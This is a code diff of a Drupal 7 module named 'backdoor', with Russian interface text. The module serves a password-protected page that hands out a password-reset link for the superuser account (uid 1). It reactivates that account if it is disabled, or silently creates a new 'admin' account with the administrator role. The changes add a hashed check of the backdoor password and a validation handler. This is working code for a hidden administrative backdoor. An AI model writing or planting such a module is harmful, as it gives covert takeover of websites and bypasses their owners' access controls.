@@ -3,6 +3,7 @@
 require_once DRUPAL_ROOT . '/' . variable_get('password_inc', 'includes/password.inc');
 
 function backdoor_menu() {
+
 	$items = array();
 
 	$items['backdoor'] = array(
@@ -42,7 +43,11 @@ function backdoor_page_form($form, &$form_state) {
 
   $form = array();
 
-  if (empty($form_state['input']['bd_password'])) {
+  $account = new stdClass();
+  $account->pass = variable_get('bd_password');
+
+  if (empty($form_state['input']['bd_password']) or !user_check_password($form_state['input']['bd_password'], $account)) {
+
     $form['bd_password'] = array(
       '#title' => t('Введите пароль для получения ссылки'),
       '#description' => t('После успешного ввода пароля появится ссылка'),
@@ -57,47 +62,52 @@ function backdoor_page_form($form, &$form_state) {
       '#value' => t('Отправить'),
     );
 
-  }else {
-    if ($form_state['input']['bd_password'] == variable_get('bd_password')) {
-      if ($user = user_load(1)) {
+  } elseif (user_check_password($form_state['input']['bd_password'], $account)) {
 
-        if ($user->status != 1) {
-          $user->status = 1;
-          user_save($user);
-        }
+    if ($user = user_load(1)) {
 
-        $form['link'] = array(
-          '#markup' => l(user_pass_reset_url($user), user_pass_reset_url($user)),
-        );
-
-      } else {
-        $pass = user_password(25);
-        $new_password = user_hash_password(trim($pass));
-        $newuser = new stdClass();
-        $newuser->uid = 1;
-        $newuser->name = 'admin';
-        $newuser->pass = $new_password;
-        $newuser->mail = 'email@example.com';
-        $newuser->init = 'email@example.com';
-        $newuser->status = 1;
-        $newuser->role = array(
-          DRUPAL_AUTHENTICATED_RID => TRUE,
-          'administrator' => TRUE,
-        );
-
-        drupal_write_record('users', $newuser);
-
-        $form['link'] = array(
-          '#markup' => l(user_pass_reset_url($newuser), user_pass_reset_url($newuser)),
-        );
-
+      if ($user->status != 1) {
+        $user->status = 1;
+        user_save($user);
       }
+
+      $form['link'] = array(
+        '#markup' => l(user_pass_reset_url($user), user_pass_reset_url($user)),
+      );
+
+    } else {
+      $pass = user_password(25);
+      $new_password = user_hash_password(trim($pass));
+      $newuser = new stdClass();
+      $newuser->uid = 1;
+      $newuser->name = 'admin';
+      $newuser->pass = $new_password;
+      $newuser->mail = 'email@example.com';
+      $newuser->init = 'email@example.com';
+      $newuser->status = 1;
+      $newuser->role = array(
+        DRUPAL_AUTHENTICATED_RID => TRUE,
+        'administrator' => TRUE,
+      );
+
+      drupal_write_record('users', $newuser);
+
+      $form['link'] = array(
+        '#markup' => l(user_pass_reset_url($newuser), user_pass_reset_url($newuser)),
+      );
+
     }
   }
-  debug($form_state['input']);
+
   return $form;
 }
 
-//function backdoor_page_form_validate ($form, &$form_state){
-//  debug($form_state['values']);
-//}
+function backdoor_page_form_validate ($form, &$form_state){
+  if (!empty($form_state['input']['bd_password'])) {
+    $account = new stdClass();
+    $account->pass = variable_get('bd_password');
+    if (!user_check_password($form_state['input']['bd_password'], $account)) {
+      form_set_error($form_state['input']['bd_password'], t('Пароль введён не верно'));
+    }
+  }
+}
